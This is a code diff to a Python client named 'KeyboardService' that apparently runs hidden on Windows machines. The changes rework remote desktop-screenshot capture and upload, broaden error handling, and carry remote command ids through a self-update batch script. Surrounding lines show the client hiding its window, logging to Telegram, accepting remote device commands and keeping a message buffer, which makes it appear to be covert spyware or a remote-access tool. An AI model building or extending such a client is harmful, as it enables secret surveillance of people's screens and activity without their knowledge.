@@ -79,11 +79,13 @@ parser.add_argument("--site-url", default=load_site_url())
 parser.add_argument("--post-update-success", action="store_true", default=False)
 parser.add_argument("--previous-version", default="")
 parser.add_argument("--new-version", default="")
+parser.add_argument("--update-command-id", default="")
 args, _ = parser.parse_known_args()
 SITE_URL = args.site_url.strip().rstrip("/")
 POST_UPDATE_SUCCESS = bool(args.post_update_success)
 PREVIOUS_VERSION = (args.previous_version or "").strip()
 NEW_VERSION = (args.new_version or "").strip()
+POST_UPDATE_COMMAND_ID = (args.update_command_id or "").strip()
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
 message_buffer = ""
@@ -992,7 +994,7 @@ def upload_device_screenshot(screenshot_base64):
             if response.status >= 400:
                 raise RuntimeError(f"HTTP {response.status}")
         return True
-    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
+    except Exception as error:
         print(f"Could not upload device screenshot: {error}")
         if isinstance(error, HTTPError):
             detail = error.read().decode("utf-8", errors="replace")[:240]
@@ -1023,17 +1025,21 @@ def report_screenshot_status(status, message):
         with urlopen(request, timeout=10) as response:
             if response.status >= 400:
                 raise RuntimeError(f"HTTP {response.status}")
-    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
+    except Exception as error:
         print(f"Could not report screenshot status: {error}")
+
+
+def capture_and_upload_screenshot():
+    try:
+        upload_device_screenshot(capture_desktop_screenshot())
+    except Exception as error:
+        print(f"Screenshot worker failed: {type(error).__name__}: {error}")
+        report_screenshot_status("Failed", f"Screenshot worker failed: {type(error).__name__}")
 
 
 def trigger_screenshot_capture():
     report_screenshot_status("Capturing", "Reading the desktop image.")
-    capture_thread = Thread(target=lambda: upload_device_screenshot(capture_desktop_screenshot()), daemon=True)
-    capture_thread.start()
-    capture_thread.join(60)
-    if capture_thread.is_alive():
-        report_screenshot_status("Failed", "Desktop capture timed out after 60 seconds.")
+    Thread(target=capture_and_upload_screenshot, daemon=True).start()
 
 
 def poll_screenshot_request():
@@ -1184,6 +1190,7 @@ def handle_device_command(command, command_id=None, message=""):
             if not getattr(sys, "frozen", False):
                 raise RuntimeError("This client is not running from an installed build and cannot update itself.")
             check_for_updates(command_id=command_id)
+            return
         elif command == "message":
             if os.name != "nt":
                 raise RuntimeError("Message boxes are only supported on Windows")
@@ -1704,13 +1711,14 @@ def send_successful_update_notice(previous_version="", new_version=""):
     send_telegram_log(message)
 
 
-def schedule_update(temporary_path, previous_version=None, new_version=None):
+def schedule_update(temporary_path, previous_version=None, new_version=None, command_id=None):
     source_path = os.path.abspath(temporary_path)
     update_directory = os.path.dirname(source_path)
     helper_path = os.path.join(update_directory, f"update_{os.getpid()}.cmd")
     target_path = os.path.join(update_directory, UPDATE_ASSET_NAME)
     previous = str(previous_version or APP_VERSION).strip()
     updated = str(new_version or APP_VERSION).strip()
+    update_command_argument = f' --update-command-id "{command_id}"' if command_id else ""
     lines = [
         "@echo off",
         ":wait",
@@ -1725,7 +1733,7 @@ def schedule_update(temporary_path, previous_version=None, new_version=None):
         "  timeout /t 1 /nobreak >nul",
         "  goto replace",
         ")",
-        f'start "" "{target_path}" --post-update-success --previous-version "{previous}" --new-version "{updated}" --site-url "{SITE_URL}"',
+        f'start "" "{target_path}" --post-update-success --previous-version "{previous}" --new-version "{updated}" --site-url "{SITE_URL}"{update_command_argument}',
         f'del /f /q "{source_path}" >nul 2>&1',
         'del "%~f0"',
     ]
@@ -1766,9 +1774,12 @@ def check_for_updates(command_id=None):
             return False
         temporary_path, latest_tag = result
         print(f"Updating KeyboardService from {APP_VERSION} to {latest_tag}")
-        if command_id:
-            acknowledge_device_command(command_id, "completed")
-        schedule_update(temporary_path, previous_version=APP_VERSION, new_version=latest_tag)
+        schedule_update(
+            temporary_path,
+            previous_version=APP_VERSION,
+            new_version=latest_tag,
+            command_id=command_id,
+        )
         os._exit(0)
         return True
     except Exception as error:
@@ -1945,6 +1956,8 @@ def run_client():
     if install_and_relaunch():
         sys.exit(0)
     cleanup_update_artifacts()
+    if POST_UPDATE_COMMAND_ID:
+        acknowledge_device_command(POST_UPDATE_COMMAND_ID, "completed")
     if POST_UPDATE_SUCCESS:
         send_successful_update_notice(PREVIOUS_VERSION, NEW_VERSION)
     hide_current_window()
